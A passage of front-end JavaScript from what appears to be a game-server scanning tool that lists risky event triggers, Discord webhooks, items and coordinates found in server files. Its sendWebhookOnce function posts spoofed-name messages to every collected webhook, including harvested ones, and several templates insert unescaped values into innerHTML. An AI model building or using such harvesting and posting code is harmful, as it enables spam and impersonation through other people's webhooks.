            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = originalHighlightedHTML;

            const textNodes = [];
            const walker = document.createTreeWalker(
                tempDiv,
                NodeFilter.SHOW_TEXT,
                null,
                false
            );
            
            let textOffset = 0;
            let node;
            while (node = walker.nextNode()) {
                const nodeText = node.textContent;
                const startOffset = textOffset;
                const endOffset = textOffset + nodeText.length;
                textNodes.push({ 
                    node, 
                    startOffset, 
                    endOffset, 
                    text: nodeText,
                    parent: node.parentNode
                });
                textOffset = endOffset;
            }

            const sortedMatches = [...searchResults].sort((a, b) => b.start - a.start);
            
            sortedMatches.forEach((match) => {
                const isCurrent = match === searchResults[currentMatchIndex];
                const highlightClass = isCurrent ? 'search-current' : 'search-match';

                let remainingLength = match.end - match.start;
                let currentOffset = match.start;
                
                for (let i = 0; i < textNodes.length && remainingLength > 0; i++) {
                    const textNode = textNodes[i];
                    
                    if (currentOffset >= textNode.startOffset && currentOffset < textNode.endOffset) {
                        const nodeStart = Math.max(0, currentOffset - textNode.startOffset);
                        const nodeEnd = Math.min(
                            textNode.text.length,
                            nodeStart + remainingLength
                        );
                        
                        if (nodeEnd > nodeStart) {
                            const beforeText = textNode.text.substring(0, nodeStart);
                            const matchText = textNode.text.substring(nodeStart, nodeEnd);
                            const afterText = textNode.text.substring(nodeEnd);

                            const span = document.createElement('span');
                            span.className = highlightClass;
                            span.textContent = matchText;

                            const parent = textNode.parent;
                            if (beforeText) {
                                parent.insertBefore(document.createTextNode(beforeText), textNode.node);
                            }
                            parent.insertBefore(span, textNode.node);
                            if (afterText) {
                                parent.insertBefore(document.createTextNode(afterText), textNode.node);
                            }
                            parent.removeChild(textNode.node);

                            remainingLength -= (nodeEnd - nodeStart);
                            currentOffset = textNode.endOffset;
                        }
                    }
                }
            });

            codeElement.innerHTML = tempDiv.innerHTML;

            const currentMatch = searchResults[currentMatchIndex];
            if (currentMatch) {
                scrollToMatch(currentMatch);
            }
            
            isSearching = false;
        }
        
        function scrollToMatch(match) {
            const textBeforeMatch = originalContent.substring(0, match.start);
            const linesBeforeMatch = textBeforeMatch.split('\n').length - 1;
            
            const lineHeight = 20; // Approximate line height
            const scrollTop = linesBeforeMatch * lineHeight;
            
            codeElement.scrollTop = Math.max(0, scrollTop - 100);
        }
        
        function updateSearchUI() {
            if (searchResults.length === 0) {
                searchCount.textContent = 'No matches';
                searchCount.className = 'no-matches';
                searchPrev.disabled = true;
                searchNext.disabled = true;
            } else {
                searchCount.textContent = `${currentMatchIndex + 1} of ${searchResults.length}`;
                searchCount.className = 'has-matches';
                searchPrev.disabled = false;
                searchNext.disabled = false;
            }
        }
        
        function clearSearch() {
            if (isSearching) return; // Prevent clearing while searching
            
            searchResults = [];
            currentMatchIndex = -1;

            if (originalHighlightedHTML) {
                codeElement.innerHTML = originalHighlightedHTML;
            } else if (originalContent) {

                const fileName = document.getElementById('file-viewer-name')?.textContent.replace('File Preview: ', '') || '';
                codeElement.innerHTML = applySyntaxHighlighting(originalContent, fileName);
            }
            
            updateSearchUI();
        }
        
        function escapeRegExp(string) {
            return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        }

        searchInput.addEventListener('input', (e) => {
            performSearch(e.target.value);
        });
        
        searchPrev.addEventListener('click', () => {
            if (searchResults.length > 0) {
                currentMatchIndex = currentMatchIndex <= 0 ? searchResults.length - 1 : currentMatchIndex - 1;
                highlightCurrentMatch();
                updateSearchUI();
            }
        });
        
        searchNext.addEventListener('click', () => {
            if (searchResults.length > 0) {
                currentMatchIndex = currentMatchIndex >= searchResults.length - 1 ? 0 : currentMatchIndex + 1;
                highlightCurrentMatch();
                updateSearchUI();
            }
        });

        searchInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (e.shiftKey) {
                    searchPrev.click();
                } else {
                    searchNext.click();
                }
            }
        });

        updateSearchUI();
        
    } catch (error) {
        console.error('Error setting up file viewer search:', error);
    }
}

function setupFileSearch(previewWindow) {
    const searchInput = previewWindow.querySelector('#file-search-input');
    const searchPrev = previewWindow.querySelector('#search-prev');
    const searchNext = previewWindow.querySelector('#search-next');
    const searchCount = previewWindow.querySelector('#search-count');
    const codeElement = previewWindow.querySelector('#preview-code');
    
    const MAX_SEARCH_RESULTS = 500;
    let searchResults = [];
    let currentMatchIndex = -1;
    let originalContent = '';
    let originalPlainText = '';
    let searchLimitReached = false;
    let contentReady = false;

    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'childList' && mutation.target === codeElement) {
                originalContent = codeElement.innerHTML;
                originalPlainText = codeElement.textContent || '';
                contentReady = true;
                observer.disconnect();
            }
        });
    });
    
    observer.observe(codeElement, { childList: true });

    searchInput.addEventListener('input', (e) => {
        const searchTerm = e.target.value.trim();
        if (searchTerm.length === 0) {
            clearSearch();
            return;
        }
        
        performSearch(searchTerm);
    });

    searchPrev.addEventListener('click', () => {
        if (searchResults.length > 0) {
            currentMatchIndex = currentMatchIndex <= 0 ? searchResults.length - 1 : currentMatchIndex - 1;
            renderHighlights();
            updateSearchUI();
        }
    });
    
    searchNext.addEventListener('click', () => {
        if (searchResults.length > 0) {
            currentMatchIndex = currentMatchIndex >= searchResults.length - 1 ? 0 : currentMatchIndex + 1;
            renderHighlights();
            updateSearchUI();
        }
    });

    searchInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (e.shiftKey) {
                searchPrev.click();
            } else {
                searchNext.click();
            }
        } else if (e.key === 'Escape') {
            clearSearch();
            searchInput.blur();
        }
    });
    
    function performSearch(searchTerm) {
        if (!contentReady || !originalPlainText) return;

        searchResults = [];
        currentMatchIndex = -1;
        searchLimitReached = false;
        
        const lowerText = originalPlainText.toLowerCase();
        const lowerTerm = searchTerm.toLowerCase();
        const termLength = searchTerm.length;
        
        let index = 0;
        while (index <= lowerText.length) {
            const foundIndex = lowerText.indexOf(lowerTerm, index);
            if (foundIndex === -1) break;
            
            searchResults.push({
                start: foundIndex,
                end: foundIndex + termLength
            });
            
            index = foundIndex + termLength;
            
            if (searchResults.length >= MAX_SEARCH_RESULTS) {
                searchLimitReached = true;
                break;
            }
        }
        
        if (searchResults.length > 0) {
            currentMatchIndex = 0;
            renderHighlights();
        } else if (contentReady) {
            codeElement.innerHTML = originalContent;
        }
        
        updateSearchUI();
    }
    
    function renderHighlights() {
        if (searchResults.length === 0 || !originalPlainText) {
            codeElement.innerHTML = originalContent;
            return;
        }
        
        let html = '';
        let lastIndex = 0;
        
        searchResults.forEach((result, index) => {
            html += escapeHtml(originalPlainText.slice(lastIndex, result.start));
            
            const matchText = escapeHtml(originalPlainText.slice(result.start, result.end));
            const className = index === currentMatchIndex ? 'search-highlight current' : 'search-highlight';
            html += `<span class="${className}">${matchText}</span>`;
            
            lastIndex = result.end;
        });
        
        html += escapeHtml(originalPlainText.slice(lastIndex));
        codeElement.innerHTML = html;
        
        scrollToCurrentHighlight();
    }
    
    function scrollToCurrentHighlight() {
        const currentHighlight = codeElement.querySelector('.search-highlight.current');
        if (currentHighlight) {
            currentHighlight.scrollIntoView({
                behavior: 'smooth',
                block: 'center'
            });
        }
    }
    
    function updateSearchUI() {
        if (searchResults.length === 0) {
            if (searchInput.value.trim().length === 0) {
                searchCount.textContent = '';
                searchCount.className = 'search-count';
            } else {
                searchCount.textContent = 'No matches';
                searchCount.className = 'search-count no-matches';
            }
        } else {
            const suffix = searchLimitReached ? '+' : '';
            searchCount.textContent = `${currentMatchIndex + 1} of ${searchResults.length}${suffix}`;
            searchCount.className = 'search-count has-matches';
        }

        const disabled = searchResults.length === 0;
        searchPrev.disabled = disabled;
        searchNext.disabled = disabled;
    }
    
    function clearSearch() {
        searchResults = [];
        currentMatchIndex = -1;
        searchLimitReached = false;
        if (contentReady) {
            codeElement.innerHTML = originalContent;
        }
        updateSearchUI();
    }
}

function copyWebhook(url) {
    try {

        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(url);
            showNotification('Webhook URL copied to clipboard', 'success');
        } else {

            const textArea = document.createElement('textarea');
            textArea.value = url;
            textArea.style.position = 'fixed';
            textArea.style.left = '-999999px';
            textArea.style.top = '-999999px';
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            
            try {
                document.execCommand('copy');
                showNotification('Webhook URL copied to clipboard', 'success');
            } catch (err) {
                showNotification('Please copy manually: ' + url, 'warning');
            }
            
            document.body.removeChild(textArea);
        }
    } catch (error) {
        console.error('Error copying webhook:', error);
        showNotification('Error copying webhook', 'error');
    }
}

async function _removed_testWebhook(url) {
    try {
        showNotification(`Testing webhook: ${url.substring(0, 30)}...`, 'info');

        webhookStatusCache.delete(url);

        const status = await validateWebhookStatus(url);
        
        if (status === 'Active') {
            showNotification(`â Webhook test successful! Message sent to Discord.`, 'success');
            return true;
        } else {
            showNotification(`â Webhook test failed: Webhook appears to be inactive`, 'error');
            return false;
        }
        
    } catch (error) {
        console.error('Error testing webhook:', error);
        showNotification(`â Webhook test failed: ${error.message}`, 'error');
        return false;
    }
}

    const webhookStatusCache = new Map();

    async function validateWebhookStatus(url) {
        try {

            if (webhookStatusCache.has(url)) {
                return webhookStatusCache.get(url);
            }

            if (!url.startsWith('https://discord.com/api/webhooks/') && 
                !url.startsWith('https://canary.discord.com/api/webhooks/') &&
                !url.startsWith('https://discordapp.com/api/webhooks/')) {
                webhookStatusCache.set(url, 'Invalid');
                return 'Invalid';
            }

            const urlParts = url.split('/');
            const webhookId = urlParts[urlParts.length - 2];
            const webhookToken = urlParts[urlParts.length - 1];
            
            if (!webhookId || !webhookToken) {
                webhookStatusCache.set(url, 'Invalid');
                return 'Invalid';
            }




            try {
                const response = await fetch(url, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                });
                
                const responseData = await response.json().catch(() => null);
                
                if (response.ok && responseData) {


                    if (responseData.id && responseData.token) {
                        webhookStatusCache.set(url, 'Active');
                        return 'Active';
                    } else {
                        webhookStatusCache.set(url, 'Invalid');
                        return 'Invalid';
                    }
                } else {

                    if (responseData && (responseData.code === 10015 || responseData.message === 'Unknown Webhook')) {
                        webhookStatusCache.set(url, 'Invalid');
                        return 'Invalid';
                    } else {

                        webhookStatusCache.set(url, 'Invalid');
                        return 'Invalid';
                    }
                }
            } catch (fetchError) {

                console.warn('Webhook validation fetch failed:', fetchError);
                if (/^[0-9]+$/.test(webhookId) && /^[a-zA-Z0-9_-]+$/.test(webhookToken)) {

                    webhookStatusCache.set(url, 'Active');
                    return 'Active';
                } else {
                    webhookStatusCache.set(url, 'Invalid');
                    return 'Invalid';
                }
            }
            
        } catch (error) {
            console.error('Error validating webhook status:', error);
            webhookStatusCache.set(url, 'Invalid');
            return 'Invalid';
        }
    }

function openWebhookPreview(webhookUrl, resourceName, fileName, lineNumber) {
    try {

        const webhook = appState.scanResults.webhooks.find(w => w.url === webhookUrl);
        
        if (webhook && webhook.file) {

            openTriggerPreview(resourceName || 'unknown', webhook.file, webhook.line || 1);
        } else {

            const previewModal = document.createElement('div');
            previewModal.className = 'file-viewer-modal';
            previewModal.style.zIndex = '10000';

            const overlay = document.createElement('div');
            overlay.className = 'file-viewer-overlay';

            const window = document.createElement('div');
            window.className = 'file-viewer-window';

            window.innerHTML = `
                <div class="file-viewer-header">
                    <div class="file-viewer-title">
                        <i class="fas fa-link"></i>
                        Webhook Preview: ${webhookUrl.substring(0, 50)}...
                    </div>
                    <button class="file-viewer-close" id="close-preview">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="file-viewer-content">
                    <pre><code>Webhook URL: ${webhookUrl}
Resource: ${resourceName || 'unknown'}
File: ${webhook?.file || fileName || 'unknown'}
Line: ${webhook?.line || lineNumber || 'unknown'}

Webhook Information:
- URL: ${webhookUrl}
- Resource: ${resourceName || 'unknown'}
- Status: ${webhook?.status || 'Active'}
- Type: Discord Webhook
- File: ${webhook?.file || fileName || 'unknown'}
- Line: ${webhook?.line || lineNumber || 'unknown'}

This webhook was discovered during the file scan process.</code></pre>
                </div>
            `;

            previewModal.appendChild(overlay);
            previewModal.appendChild(window);
            document.body.appendChild(previewModal);

            const closeBtn = window.querySelector('#close-preview');
            const closePreview = () => {
                document.body.removeChild(previewModal);
            };

            closeBtn.addEventListener('click', closePreview);
            overlay.addEventListener('click', closePreview);

            const handleEscape = (e) => {
                if (e.key === 'Escape') {
                    closePreview();
                    document.removeEventListener('keydown', handleEscape);
                }
            };
            document.addEventListener('keydown', handleEscape);

            showNotification(`Opening webhook preview: ${webhookUrl.substring(0, 30)}...`, 'info');
        }
    } catch (error) {
        console.error('Error opening webhook preview:', error);
        showNotification('Error opening webhook preview', 'error');
    }
}

function copyItemName(name) {
    try {

        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(name);
            showNotification('Item name copied to clipboard', 'success');
        } else {

            const textArea = document.createElement('textarea');
            textArea.value = name;
            textArea.style.position = 'fixed';
            textArea.style.left = '-999999px';
            textArea.style.top = '-999999px';
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            
            try {
                document.execCommand('copy');
                showNotification('Item name copied to clipboard', 'success');
            } catch (err) {
                showNotification('Please copy manually: ' + name, 'warning');
            }
            
            document.body.removeChild(textArea);
        }
    } catch (error) {
        console.error('Error copying item name:', error);
        showNotification('Error copying item name', 'error');
    }
}

function viewItem(name) {
    showNotification(`Viewing item: ${name}`, 'info');
}

function transferItemToEditor(itemName, resourceName) {
    try {

        switchTab('editor');

        const resourceInput = document.getElementById('resource-name');
        if (resourceInput) {
            resourceInput.value = resourceName || 'unknown';
        }

        const editorTextarea = document.getElementById('editor-textarea');
        if (editorTextarea) {
            editorTextarea.value = `-- Item: ${itemName}\n-- Resource: ${resourceName || 'unknown'}\n-- Generated by Finder\n\n-- Add your item-related code here`;
        }
        
        showNotification(`Transferred item ${itemName} to editor`, 'success');
    } catch (error) {
        console.error('Error transferring item to editor:', error);
        showNotification('Error transferring item to editor', 'error');
    }
}

function openItemPreview(itemName, resourceName) {
    try {

        const item = appState.scanResults.items.find(item => item.name === itemName);
        
        if (item && item.file) {

            openTriggerPreview(resourceName || 'unknown', item.file, item.line || 1);
        } else {

            const previewModal = document.createElement('div');
            previewModal.className = 'file-viewer-modal';
            previewModal.style.zIndex = '10000';

            const overlay = document.createElement('div');
            overlay.className = 'file-viewer-overlay';

            const window = document.createElement('div');
            window.className = 'file-viewer-window';

            window.innerHTML = `
                <div class="file-viewer-header">
                    <div class="file-viewer-title">
                        <i class="fas fa-cube"></i>
                        Item Preview: ${itemName}
                    </div>
                    <button class="file-viewer-close" id="close-preview">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="file-viewer-content">
                    <pre><code>Item Name: ${itemName}
Resource: ${resourceName || 'unknown'}
File: ${item?.file || 'unknown'}
Line: ${item?.line || 'unknown'}

Item Information:
- Name: ${itemName}
- Label: ${item?.label || 'No label'}
- Type: Item
- Status: Found in scan

This item was discovered during the file scan process.</code></pre>
                </div>
            `;

            previewModal.appendChild(overlay);
            previewModal.appendChild(window);
            document.body.appendChild(previewModal);

            const closeBtn = window.querySelector('#close-preview');
            const closePreview = () => {
                document.body.removeChild(previewModal);
            };

            closeBtn.addEventListener('click', closePreview);
            overlay.addEventListener('click', closePreview);

            const handleEscape = (e) => {
                if (e.key === 'Escape') {
                    closePreview();
                    document.removeEventListener('keydown', handleEscape);
                }
            };
            document.addEventListener('keydown', handleEscape);

            showNotification(`Opening item preview: ${itemName}`, 'info');
        }
    } catch (error) {
        console.error('Error opening item preview:', error);
        showNotification('Error opening item preview', 'error');
    }
}

function saveItem(itemName, resourceName) {
    try {

        const itemId = `item_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

        const savedItem = {
            id: itemId,
            name: itemName,
            resource: resourceName || 'unknown',
            type: 'item',
            savedAt: new Date().toISOString(),
            originalData: {
                name: itemName,
                resource: resourceName || 'unknown'
            }
        };

        appState.savedTriggers.push(savedItem);

        saveTriggersToLocalStorage();

        updateSavedTriggersList();

        updateStats();
        
        showNotification(`Saved item: ${itemName}`, 'success');
    } catch (error) {
        console.error('Error saving item:', error);
        showNotification('Error saving item', 'error');
    }
}

function copyCoordinates(coordinates) {
    try {

        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(coordinates);
            showNotification('Coordinates copied to clipboard', 'success');
        } else {

            const textArea = document.createElement('textarea');
            textArea.value = coordinates;
            textArea.style.position = 'fixed';
            textArea.style.left = '-999999px';
            textArea.style.top = '-999999px';
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            
            try {
                document.execCommand('copy');
                showNotification('Coordinates copied to clipboard', 'success');
            } catch (err) {
                showNotification('Please copy manually: ' + coordinates, 'warning');
            }
            
            document.body.removeChild(textArea);
        }
    } catch (error) {
        console.error('Error copying coordinates:', error);
        showNotification('Error copying coordinates', 'error');
    }
}

function copyCoordinatesValues(x, y, z, w = null) {
    try {
        const values = w !== null ? `${x}, ${y}, ${z}, ${w}` : `${x}, ${y}, ${z}`;
        navigator.clipboard.writeText(values);
        showNotification('Coordinate values copied to clipboard', 'success');
    } catch (error) {
        console.error('Error copying coordinate values:', error);
        showNotification('Error copying coordinate values', 'error');
    }
}

function viewCoordinates(resource, file, line) {
    try {

        openTriggerPreview(resource, file, line);
    } catch (error) {
        console.error('Error opening coordinates preview:', error);
        showNotification(`Error opening coordinates preview: ${resource} in ${file}:${line}`, 'error');
    }
}



function handleCoordinateSearch(event) {
    const searchTerm = event.target.value.toLowerCase();
    const typeFilter = document.getElementById('coordinate-type-filter')?.value || 'all';
    
    let filteredCoordinates = appState.scanResults.coordinates.filter(coord => {
        const matchesSearch = coord.resource.toLowerCase().includes(searchTerm) ||
                            coord.coordinates.toLowerCase().includes(searchTerm) ||
                            coord.type.toLowerCase().includes(searchTerm) ||
                            (coord.nearItem && coord.nearItem.toLowerCase().includes(searchTerm));
        
        const matchesType = typeFilter === 'all' || coord.type === typeFilter;
        
        return matchesSearch && matchesType;
    });
    
    updateCoordinatesTable(filteredCoordinates);
}

function handleCoordinateTypeFilter(event) {
    const typeFilter = event.target.value;
    const searchTerm = document.getElementById('coordinate-search')?.value.toLowerCase() || '';
    
    let filteredCoordinates = appState.scanResults.coordinates.filter(coord => {
        const matchesSearch = coord.resource.toLowerCase().includes(searchTerm) ||
                            coord.coordinates.toLowerCase().includes(searchTerm) ||
                            coord.type.toLowerCase().includes(searchTerm) ||
                            (coord.nearItem && coord.nearItem.toLowerCase().includes(searchTerm));
        
        const matchesType = typeFilter === 'all' || coord.type === typeFilter;
        
        return matchesSearch && matchesType;
    });
    
    updateCoordinatesTable(filteredCoordinates);
}

function updateSavedTriggersList() {
    try {
        const container = document.getElementById('saved-triggers-list');
        if (!container) return;

        container.innerHTML = '';
        
        if (appState.savedTriggers.length === 0) {
            container.innerHTML = '<p style="color: #9a9aa8; text-align: center;">No saved triggers yet</p>';
            return;
        }

        appState.savedTriggers.forEach(trigger => {
            const triggerElement = document.createElement('div');
            triggerElement.className = 'saved-trigger-item';
            triggerElement.style.cssText = `
                background: rgba(255, 255, 255, 0.05);
                padding: 15px;
                margin-bottom: 10px;
                border-radius: 6px;
                border: 1px solid rgba(255, 255, 255, 0.1);
            `;
            
            triggerElement.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <h4 style="color: #ffffff; margin: 0; cursor: pointer;" onclick="editTriggerName(${trigger.id}, '${trigger.resource.replace(/'/g, "\\'")}')" title="Click to edit name">
                        <i class="fas fa-edit" style="margin-right: 5px; font-size: 10px; opacity: 0.7;"></i>${trigger.resource}
                    </h4>
                    <span style="padding: 4px 8px; border-radius: 4px; font-size: 12px; background: #ededed; color: white;">${trigger.risk.toUpperCase()}</span>
                </div>
                <p style="color: #9a9aa8; margin: 0; font-size: 14px; font-family: 'Courier New', monospace; word-wrap: break-word; cursor: pointer;" onclick="editTriggerUsage(${trigger.id}, '${trigger.usage.replace(/'/g, "\\'").replace(/"/g, '&quot;')}')" title="Click to edit usage">
                    <i class="fas fa-edit" style="margin-right: 5px; font-size: 10px; opacity: 0.7;"></i>Usage: ${trigger.usage}
                </p>
                <div style="margin-top: 10px; display: flex; gap: 10px;">
                    <button onclick="copyTrigger('${trigger.usage.replace(/'/g, "\\'")}')" style="padding: 4px 8px; background: #e3b341; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                    <button onclick="editSavedTrigger(${trigger.id})" style="padding: 4px 8px; background: #ededed; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">
                        <i class="fas fa-edit"></i> Edit
                    </button>
                    <button onclick="deleteSavedTrigger(${trigger.id})" style="padding: 4px 8px; background: #e05572; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                </div>
            `;
            
            container.appendChild(triggerElement);
        });
    } catch (error) {
        console.error('Error updating saved triggers list:', error);
    }
}

function deleteSavedTrigger(id) {
    try {
        appState.savedTriggers = appState.savedTriggers.filter(trigger => trigger.id !== id);
        saveTriggersToLocalStorage();
        updateSavedTriggersList();
        updateStats();
        showNotification('Saved trigger deleted', 'success');
    } catch (error) {
        console.error('Error deleting saved trigger:', error);
        showNotification('Error deleting saved trigger', 'error');
    }
}

let clearResultsInProgress = false;

function clearResults() {
    if (clearResultsInProgress) {
        return;
    }
    clearResultsInProgress = true;
    
    try {

        const triggersTbody = document.getElementById('triggers-tbody');
        if (triggersTbody) {
            triggersTbody.innerHTML = '';
        }

        const webhooksTbody = document.getElementById('webhooks-tbody');
        if (webhooksTbody) {
            webhooksTbody.innerHTML = '';
        }

        const itemsTbody = document.getElementById('items-tbody');
        if (itemsTbody) {
            itemsTbody.innerHTML = '';
        }

        const coordinatesTbody = document.getElementById('coordinates-tbody');
        if (coordinatesTbody) {
            coordinatesTbody.innerHTML = '';
        }

        const resourceTree = document.getElementById('resource-tree');
        if (resourceTree) {
            resourceTree.innerHTML = `
                <div class="resource-item" style="text-align: center; color: #9a9aa8; font-style: italic; padding: 20px;">
                    <i class="fas fa-folder" style="margin-right: 8px;"></i>
                    Select a server directory to explore
                </div>
            `;
        }

        appState.scanResults = {
            triggers: [],
            webhooks: [],
            items: [],
            coordinates: [],
            anticheats: [],
            files: 0
        };

        appState.selectedFiles = [];
        appState.serverDirectory = '';

        const serverDirectoryInput = document.getElementById('server-directory-input');
        if (serverDirectoryInput) {
            serverDirectoryInput.value = '';
        }

        const searchInput = document.getElementById('search-input');
        if (searchInput) {
            searchInput.value = '';
        }

        const resourceSearchInput = document.getElementById('resource-search-input');
        if (resourceSearchInput) {
            resourceSearchInput.value = '';
        }

        const coordinateSearch = document.getElementById('coordinate-search');
        if (coordinateSearch) {
            coordinateSearch.value = '';
        }
        
        const coordinateTypeFilter = document.getElementById('coordinate-type-filter');
        if (coordinateTypeFilter) {
            coordinateTypeFilter.value = 'all';
        }

        updateTriggersTable([]);
        updateKnownTriggersTable([]);
        updateWebhooksTable([]);
        updateItemsTable([]);
        updateCoordinatesTable([]);

        updateStats();
        
        showNotification('All results cleared', 'success');
    } catch (error) {
        console.error('Error clearing results:', error);
        showNotification('Error clearing results', 'error');
    } finally {
        clearResultsInProgress = false;
    }
}

function applyTriggerFilter() {
    const currentTypeFilter = appState.triggerFilter || 'all';
    const currentRiskFilter = appState.riskFilter || 'all';
    const searchInput = document.getElementById('search-input');
    const searchTerm = searchInput ? searchInput.value.toLowerCase() : '';
    
    let filteredTriggers = appState.scanResults.triggers || [];

    filteredTriggers = filteredTriggers.filter(trigger => {
        return !(trigger.aiAnalysis && trigger.aiAnalysis.category === 'Known');
    });

    if (currentTypeFilter !== 'all') {
        filteredTriggers = filteredTriggers.filter(trigger => {
            return trigger.triggerType === currentTypeFilter;
        });
    }

    if (currentRiskFilter !== 'all') {
        filteredTriggers = filteredTriggers.filter(trigger => {
            return trigger.risk === currentRiskFilter;
        });
    }

    if (searchTerm) {
        filteredTriggers = filteredTriggers.filter(trigger => 
            trigger.resource.toLowerCase().includes(searchTerm) ||
            trigger.usage.toLowerCase().includes(searchTerm)
        );
    }

        updateTriggersTable(filteredTriggers);
}

function handleSearch(event) {
    const searchTerm = event.target.value.toLowerCase();
    const currentTab = appState.currentTab;
    
    if (currentTab === 'triggers') {

        applyTriggerFilter();
    } else if (currentTab === 'items') {

        applyItemsFilter();
    } else if (currentTab === 'webhooks') {

        const filteredWebhooks = appState.scanResults.webhooks.filter(webhook => 
            webhook.resource.toLowerCase().includes(searchTerm) ||
            webhook.url.toLowerCase().includes(searchTerm)
        );
        
        updateWebhooksTable(filteredWebhooks);
    } else if (currentTab === 'coordinates') {

        const filteredCoordinates = appState.scanResults.coordinates.filter(coord => 
            coord.resource.toLowerCase().includes(searchTerm) ||
            coord.coordinates.toLowerCase().includes(searchTerm) ||
            coord.type.toLowerCase().includes(searchTerm) ||
            (coord.nearItem && coord.nearItem.toLowerCase().includes(searchTerm))
        );
        
        updateCoordinatesTable(filteredCoordinates);
    } else if (currentTab === 'known-triggers') {

        applyKnownTriggersFilter();
    }
}

function updateStats() {
    try {
        const knownCount = appState.knownTriggers.length;
        const savedCount = appState.savedTriggers.length;
        const itemsCount = appState.scanResults.items.length;
        const webhooksCount = appState.scanResults.webhooks.length + appState.manualWebhooks.length;
        const triggersCount = appState.scanResults.triggers.length;
        const coordinatesCount = appState.scanResults.coordinates.length;
        const filesCount = appState.scanResults.files || 0;
        
        const knownElement = document.getElementById('known-count');
        const triggersElement = document.getElementById('triggers-count');
        const itemsElement = document.getElementById('items-count');
        const webhooksElement = document.getElementById('webhooks-count');
        const filesElement = document.getElementById('files-count');
        
        if (knownElement) knownElement.textContent = `${knownCount} Known`;
        if (triggersElement) triggersElement.textContent = `${triggersCount} Triggers`;
        if (itemsElement) itemsElement.textContent = `${itemsCount} Items`;
        if (webhooksElement) webhooksElement.textContent = `${webhooksCount} Webhooks`;
        if (filesElement) filesElement.textContent = `${filesCount} Files`;
    } catch (error) {
        console.error('Error updating stats:', error);
    }
}

function handleActionButton(action) {
    try {
        switch (action) {
            case 'Browse':
                browseServerDirectory();
                break;
            case 'Deep Scan':
                performDeepScan();
                break;
            case 'Clear Results':
                clearResults();
                break;
        }
    } catch (error) {
        console.error('Error handling action button:', error);
    }
}

function getWebhookUrls() {
    const webhookUrls = [];
    const webhookInputs = document.querySelectorAll('.webhook-url-input');
    webhookInputs.forEach(input => {
        const url = input.value.trim();
        if (url) {
            webhookUrls.push(url);
        }
    });
    return [...new Set([...webhookUrls, ...appState.selectedWebhooks, ...appState.manualWebhooks])];
}

async function sendWebhookOnce() {
    try {
        const webhookUrls = getWebhookUrls();
        if (webhookUrls.length === 0) {
            showNotification('Please add at least one webhook URL', 'error');
            return;
        }
        
        const username = document.getElementById('override-username')?.value || '';
        const message = document.getElementById('message-content')?.value || '';
        const avatarUrl = document.getElementById('avatar-url')?.value || '';
        const tts = document.getElementById('tts-checkbox')?.checked || false;
        const embed = document.getElementById('embed-checkbox')?.checked || false;
        
        if (!message.trim()) {
            showNotification('Please enter a message', 'error');
            return;
        }
        
        showNotification(`Sending webhook to ${webhookUrls.length} webhook(s)...`, 'info');

        const payload = {
            content: message,
            tts: tts
        };

        if (username && username.trim()) {
            payload.username = username.trim();
        }

        if (avatarUrl && avatarUrl.trim()) {
            payload.avatar_url = avatarUrl.trim();
        }
        
        if (embed) {
            const embedTitle = document.getElementById('embed-title')?.value || '';
            const embedDescription = document.getElementById('embed-description')?.value || '';
            const embedColorHex = document.getElementById('embed-color')?.value || '#ededed';
            const embedAuthorName = document.getElementById('embed-author-name')?.value || '';
            const embedAuthorIcon = document.getElementById('embed-author-icon')?.value || '';
            const embedFooterText = document.getElementById('embed-footer-text')?.value || '';
            const embedFooterIcon = document.getElementById('embed-footer-icon')?.value || '';
            const embedThumbnailUrl = (document.getElementById('embed-thumbnail-url')?.value || '').trim();
            const embedImageUrl = (document.getElementById('embed-image-url')?.value || '').trim();
            
            const colorValue = embedColorHex.startsWith('#') ? embedColorHex : '#' + embedColorHex;
            const embedColor = parseInt(colorValue.replace('#', ''), 16);
            
            const embedObj = {
                color: embedColor,
                timestamp: new Date().toISOString()
            };
            
            if (embedTitle) embedObj.title = embedTitle;
            if (embedDescription) embedObj.description = embedDescription;
            if (embedAuthorName || embedAuthorIcon) {
                embedObj.author = {};
                if (embedAuthorName) embedObj.author.name = embedAuthorName;
                if (embedAuthorIcon) embedObj.author.icon_url = embedAuthorIcon;
            }
            if (embedFooterText || embedFooterIcon) {
                embedObj.footer = {};
                if (embedFooterText) embedObj.footer.text = embedFooterText;
                if (embedFooterIcon) embedObj.footer.icon_url = embedFooterIcon;
            }
            if (embedThumbnailUrl) {
                embedObj.thumbnail = { url: embedThumbnailUrl };
            }
            if (embedImageUrl) {
                embedObj.image = { url: embedImageUrl };
            }
            
            payload.embeds = [embedObj];
        }

        let successCount = 0;
        let errorCount = 0;
        
        for (const webhookUrl of webhookUrls) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    successCount++;
                } else {
                    errorCount++;
                    console.error(`Failed to send webhook to ${webhookUrl}: ${response.status}`);
                }
            } catch (error) {
                errorCount++;
                console.error(`Error sending webhook to ${webhookUrl}:`, error);
            }
        }
        
        if (successCount > 0) {
            showNotification(`Successfully sent to ${successCount} webhook(s)${errorCount > 0 ? `, ${errorCount} failed` : ''}`, 'success');
        } else {
            showNotification(`Failed to send to any webhooks (${errorCount} errors)`, 'error');
        }
        
